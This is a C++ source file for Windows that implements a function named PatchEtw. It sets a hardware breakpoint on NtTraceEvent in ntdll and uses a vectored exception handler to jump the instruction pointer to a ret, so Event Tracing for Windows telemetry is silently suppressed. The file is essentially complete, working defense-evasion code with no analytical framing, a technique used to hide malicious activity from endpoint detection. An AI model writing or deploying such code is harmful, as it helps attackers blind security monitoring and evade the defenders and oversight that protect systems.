#include <Windows.h>
#include <iostream>

#define PRINT_ERROR(funcName) \
    do { \
        DWORD err = GetLastError(); \
        printf("[ERROR] %s failed. GetLastError() = %lu\n", \
               funcName, err); \
    } while (0)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _EVENT_DESCRIPTOR
{
	USHORT Id;
	UCHAR Version;
	UCHAR Channel;
	UCHAR Level;
	UCHAR Opcode;
	USHORT Task;
	ULONGLONG Keyword;
} EVENT_DESCRIPTOR, * PEVENT_DESCRIPTOR;

typedef ULONGLONG REGHANDLE, * PREGHANDLE;
typedef const EVENT_DESCRIPTOR* PCEVENT_DESCRIPTOR;
typedef struct _EVENT_DATA_DESCRIPTOR EVENT_DATA_DESCRIPTOR, * PEVENT_DATA_DESCRIPTOR;

typedef ULONG
(NTAPI*
	_EtwEventWrite)(
		_In_ REGHANDLE RegHandle,
		_In_ PCEVENT_DESCRIPTOR EventDescriptor,
		_In_ ULONG UserDataCount,
		_In_reads_opt_(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData
		);

PVOID FindOpcode(PVOID pAddress, BYTE opcode, DWORD dwLengthSearch)
{
	for (DWORD i = 0; i < dwLengthSearch; i++)
	{
		if (*((BYTE*)pAddress + i) == opcode)
		{
			return (PVOID)((BYTE*)pAddress + i);
		}
	}

	return NULL;
}

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{
		PVOID ret = FindOpcode((PVOID)ExceptionInfo->ContextRecord->Rip, 0xC3, 10000);
		if (ret) {
			std::cout << "Found ret at: " << ret << std::endl;
			std::cout << GetThreadId(GetCurrentThread()) << std::endl;
			ExceptionInfo->ContextRecord->Rip = (DWORD64)ret;
			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

int PatchEtw() {
	AddVectoredExceptionHandler(1, ExceptionHandler);

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	_EtwEventWrite pEtwEventWrite = (_EtwEventWrite)GetProcAddress(hNtdll, "NtTraceEvent");
	if (!pEtwEventWrite) {
		PRINT_ERROR("EtwEventWrite");
		return 0;
	}

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	RtlCaptureContext(&ctx);

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	ctx.Dr0 = (DWORD64)pEtwEventWrite;
	//ctx.Dr1 = (DWORD64)GetProcAddress(hNtdll, "EtwEventWriteTransfer");
	ctx.Dr7 |= 1ull << (2 * 0);
	ctx.Dr7 &= ~(3ull << (16 + 4 * 0));
	ctx.Dr7 &= ~(3ull << (18 + 4 * 0));

	typedef NTSTATUS
	(NTAPI*
		_NtContinue)(
			_In_ PCONTEXT ContextRecord,
			_In_ BOOLEAN TestAlert
			);

	_NtContinue pNtContinue = (_NtContinue)GetProcAddress(hNtdll, "NtContinue");
	if (!pNtContinue) {
		PRINT_ERROR("NtContinue");
		return 0;
	}

	NTSTATUS ntStatus = pNtContinue(&ctx, FALSE);
	if (!NT_SUCCESS(ntStatus)) {
		std::cout << "NtContinue: " << GetLastError() << std::endl;
		return 0;
	}

	//EVENT_DESCRIPTOR ed = { 0 };
	//ed.Id = 1;
	//ed.Level = 4;  // INFORMATION
	//NTSTATUS hr = pEtwEventWrite(0, &ed, 0, nullptr);


	return 1;
	//std::cout << "Success process" << std::endl;
}